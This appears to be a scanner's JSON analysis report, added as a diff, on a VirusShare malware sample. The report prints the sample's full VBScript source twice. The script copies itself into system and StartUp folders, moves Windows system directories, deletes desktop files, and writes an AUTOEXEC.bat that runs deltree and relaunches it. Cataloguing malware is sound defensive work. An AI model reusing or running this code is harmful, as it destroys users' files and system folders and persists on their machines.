@@ -1,0 +1,80 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "COMMAND": "May run PowerShell commands",
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Run": "May run an executable file or a system command",
+            "SYSTEM": "May run an executable file or a system command on a Mac",
+            "WINDOWS": "May enumerate application windows",
+            "shell": "May run an executable file or a system command",
+            "wscript.shell": "May run an executable file or a system command"
+        },
+        "macro": "\nMsgBox (\"your computer is in the controle of SATAN!\", 16, \"Fear\")\nOn Error Resume Next\n\nDim filesys, newfolder, newfolderpath\nnewfolderpath = \"c:\\MyFolder\"\nset filesys=CreateObject(\"Scripting.FileSystemObject\")\nIf Not filesys.FolderExists(newfolderpath) Then\nSet newfolder = filesys.CreateFolder(newfolderpath)\nEnd If\n\nfso.CopyFile Wscript.ScriptFullName, \"C:\\WINDOWS\\SYSTEM\\fun.vbs\", True\n\nfilesys.MoveFile \"C:\\WINDOWS\\SYSTEM\\*.*\",\"C:\\WINDOWS\\MyFolder\\\"\n\nfilesys, newfolder, newfolderpath\nnewfolderpath = \"c:\\WINDOWS\\SYSTEM\"\nset filesys=CreateObject(\"Scripting.FileSystemObject\")\nIf Not filesys.FolderExists(newfolderpath) Then\nSet newfolder = filesys.CreateFolder(newfolderpath)\nEnd If\n\nfso.CopyFile Wscript.ScriptFullName, \"C:\\MyFolder\", True\n\nfso.CopyFile Wscript.ScriptFullName, \"C:\\WINDOWS\\SYSTEM\\fun.vbs\", True\n\nfilesys.MoveFile \"C:\\WINDOWS\\SYSTEM32\",\"C:\\WINDOWS\\SYSTEM\"\n\nfso.CopyFile Wscript.ScriptFullName, \"C:\\WINDOWS\\SYSTEM\\SYSTEM32\\fun.vbs\", True\nfso.CopyFile Wscript.ScriptFullName, \"C:\\WINDOWS\\StartMenu\\Programs\\StartUp\\fun.vbs\", True\n\nfso.DeleteFile \"C:\\WINDOWS\\COMMAND\\EBD\\AUTOEXEC\",True\nfso.DeleteFile \"C:\\WINDOWS\\Desktop\\*.*\"\n\nfso.CopyFile Wscript.ScriptFullName, \"C:\\fun.vbs\", True\nset shell=wscript.createobject(\"wscript.shell\")\nset msc=shell.CreateShortCut(\"C:\\WINDOWS\\COMMAND\\EBD\\AUTOEXEC.bat\")\nmsc.TargetPath=shell.ExpandEnvironment(\"C:\\fun.vbs\")\nmsc.WindowStyle=4\nmsc.Save\nset batch=fso.CreateTextFile(\"C:\\AUTOEXEC.bat\")\nbatch.WriteLine \"@echo off\"\nbatch.WriteLine \"cls\"\nbatch.WriteLine \"deltree C:\\WINDOWS\\Desktop\\*.*\"\nbatch.WriteLine \"start C:\\WINDOWS\\SYSTEM\\fun.vbs\"\nbatch.Close\nshell.Run  \"C:\\AUTOEXEC.bat\"\nend sub "
+    },
+    "filename": "VirusShare_45459348b5f8d161341e2f09c2db5b51",
+    "filesize": 1692,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "45459348b5f8d161341e2f09c2db5b51",
+        "sha1": "6a5510d18d4ae66071b714b174774a4bf0c79807",
+        "sha256": "cd64f6e1a1a1aad83e9608e8d3de268d0d4a9c7f042a0f9e1ba52de17cfb23d5"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "MsgBox (\"your computer is in the controle of SATAN!\", 16, \"Fear\")",
+            "On Error Resume Next",
+            "Dim filesys, newfolder, newfolderpath",
+            "newfolderpath = \"c:\\MyFolder\"",
+            "set filesys=CreateObject(\"Scripting.FileSystemObject\")",
+            "If Not filesys.FolderExists(newfolderpath) Then",
+            "Set newfolder = filesys.CreateFolder(newfolderpath)",
+            "End If",
+            "fso.CopyFile Wscript.ScriptFullName, \"C:\\WINDOWS\\SYSTEM\\fun.vbs\", True",
+            "filesys.MoveFile \"C:\\WINDOWS\\SYSTEM\\*.*\",\"C:\\WINDOWS\\MyFolder\\\"",
+            "filesys, newfolder, newfolderpath",
+            "newfolderpath = \"c:\\WINDOWS\\SYSTEM\"",
+            "set filesys=CreateObject(\"Scripting.FileSystemObject\")",
+            "If Not filesys.FolderExists(newfolderpath) Then",
+            "Set newfolder = filesys.CreateFolder(newfolderpath)",
+            "End If",
+            "fso.CopyFile Wscript.ScriptFullName, \"C:\\MyFolder\", True",
+            "fso.CopyFile Wscript.ScriptFullName, \"C:\\WINDOWS\\SYSTEM\\fun.vbs\", True",
+            "filesys.MoveFile \"C:\\WINDOWS\\SYSTEM32\",\"C:\\WINDOWS\\SYSTEM\"",
+            "fso.CopyFile Wscript.ScriptFullName, \"C:\\WINDOWS\\SYSTEM\\SYSTEM32\\fun.vbs\", True",
+            "fso.CopyFile Wscript.ScriptFullName, \"C:\\WINDOWS\\StartMenu\\Programs\\StartUp\\fun.vbs\", True",
+            "fso.DeleteFile \"C:\\WINDOWS\\COMMAND\\EBD\\AUTOEXEC\",True",
+            "fso.DeleteFile \"C:\\WINDOWS\\Desktop\\*.*\"",
+            "fso.CopyFile Wscript.ScriptFullName, \"C:\\fun.vbs\", True",
+            "set shell=wscript.createobject(\"wscript.shell\")",
+            "set msc=shell.CreateShortCut(\"C:\\WINDOWS\\COMMAND\\EBD\\AUTOEXEC.bat\")",
+            "msc.TargetPath=shell.ExpandEnvironment(\"C:\\fun.vbs\")",
+            "msc.WindowStyle=4",
+            "msc.Save",
+            "set batch=fso.CreateTextFile(\"C:\\AUTOEXEC.bat\")",
+            "batch.WriteLine \"@echo off\"",
+            "batch.WriteLine \"cls\"",
+            "batch.WriteLine \"deltree C:\\WINDOWS\\Desktop\\*.*\"",
+            "batch.WriteLine \"start C:\\WINDOWS\\SYSTEM\\fun.vbs\"",
+            "batch.Close",
+            "shell.Run  \"C:\\AUTOEXEC.bat\"",
+            "end sub "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.279340",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
